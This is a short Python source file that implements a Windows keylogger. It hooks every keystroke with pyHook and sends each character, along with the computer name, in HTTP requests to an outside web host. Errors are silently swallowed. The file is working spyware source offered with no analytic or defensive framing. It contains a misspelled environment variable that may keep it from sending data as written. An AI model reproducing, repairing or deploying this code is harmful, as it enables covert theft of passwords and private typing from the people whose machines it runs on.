import pyHook, pythoncom, os, httplib, urllib, getpass, shutil, sys
#write the functions
def OnKeyBoardEvent(event):
    try:
        params = urllib.urlencode({'pcName': os.environ['COMPUTERANME'], 'toLog': chr(event.Ascii)})
        conn = httplib.HTTPConnection("keey.sportsontheweb.net")
        conn.request("GET", "/index.php?" + params)
    except:
        pass
    return True
hook_manager = pyHook.HookManager() #new hookmanager object
hook_manager.KeyDown = OnKeyBoardEvent #tells what to do when the user press the button
hook_manager.HookKeyboard()# tells the program to keep hooking the messages
pythoncom.PumpMessages()# keeps the program running
